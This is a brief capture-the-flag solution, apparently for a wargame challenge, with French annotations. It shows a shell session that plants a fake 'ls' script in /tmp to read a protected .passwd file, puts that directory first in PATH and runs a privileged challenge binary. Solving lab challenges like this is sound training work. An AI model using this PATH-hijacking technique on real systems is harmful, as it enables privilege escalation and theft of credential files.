app-script-ch12@challenge02:~$ mkdir /tmp/qubit/ 
app-script-ch12@challenge02:~$ echo '#!/bin/sh' >/tmp/qubit/ls 
app-script-ch12@challenge02:~$ echo 'cat ' /challenge/app-script/ch12/.passwd >>/tmp/qubit/ls
app-script-ch12@challenge02:~$ chmod +x /tmp/qubit/ls
app-script-ch12@challenge02:~$ export PATH=/tmp/qubit/:$PATH
app-script-ch12@challenge02:~$ /challenge/app-script/ch12/ch12 

:rappel legende:
mkdir = creer dossier
echo = afficher
chmod = permet de changer les permissions d'accès d'un fichier ou d'un répertoire.
export = ajouter un répertoire au Path sur Linux.

toujours plus fun de faire sois meme le challenge vener ici que si vous etes vraiment bloquer ou si vous avez terminer.'
